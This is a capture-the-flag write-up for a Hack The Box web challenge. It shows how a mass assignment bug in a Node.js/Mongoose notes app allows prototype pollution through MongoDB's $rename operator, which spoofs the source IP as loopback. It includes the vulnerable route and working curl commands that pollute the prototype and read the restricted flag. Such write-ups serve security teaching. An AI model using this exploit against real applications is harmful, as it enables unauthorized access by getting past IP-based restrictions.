## HTB Challenge Write-up: Secure Notes (Web)
Challenge Overview
Secure Notes is a Node.js web application built using Express and Mongoose (MongoDB). The objective of the challenge is to access the restricted /flag endpoint, which employs an IP whitelist filter restricting access solely to the local loopback address (127.0.0.1, ::1, or ::ffff:127.0.0.1).

By leveraging a Mass Assignment vulnerability on the update route, an attacker can trigger a Prototype Pollution attack targeting internal Node.js socket properties to forge their source IP address.

**Vulnerability Analysis**

1. Mass Assignment (Unsanitized Database Updates)
In challenge/src/app.js, the /update route takes the entire raw req.body and feeds it directly into Mongoose's update query structure without field whitelisting:

```javascript
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body); // Vulnerability here directly add re.body 
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } // ...
});

```
Because req.body is completely unchecked, we can supply MongoDB core update operators like $rename.

2. Prototype Pollution via $rename
The MongoDB $rename operator moves field values to a new key path. When processed through Mongoose on vulnerable versions, specifying paths containing __proto__ allows the input to step out of the database document scope and inject properties directly into JavaScript's global runtime memory space (Object.prototype).

**Exploitation Methodology**

Step 1: Analyze the Target Environment
The target container runs Node 21 (node:21-bullseye). In Node 21's network subsystem layer, when an application accesses req.connection.remoteAddress, the engine dynamically retrieves the string property via an internal helper object:

```javascript
get remoteAddress() {
    return this._peername ? this._peername.address : undefined;
}

```

Step 2: Poisoning the Global Object
By invoking the $rename operator, we can pollute Object.prototype._peername.address globally. This ensures that any fresh incoming request wrapper lacking an explicitly defined network address structure falls back onto our injected string parameter.


```bash
# 1. Instantiate a new document node holding our spoofed IP string
TARGET="http://<CHALLENGE_IP>:<PORT>"
ID=$(curl -s -X POST "$TARGET/create" \
  -H 'Content-Type: application/json' \
  -d '{"title":"127.0.0.1","content":"IPv4"}' | jq -r "._id")

# 2. Rename the 'title' key field path to pollute the global Object prototype
curl -s -X POST "$TARGET/update" \
  -H 'Content-Type: application/json' \
  -d "{
    \"noteId\":\"$ID\",
    \"\$rename\": {
      \"title\":\"__proto__._peername.address\"
    }
  }"

```
and fetch for flag 

```bash
curl -s -H "Connection: close" "$TARGET/flag"

```
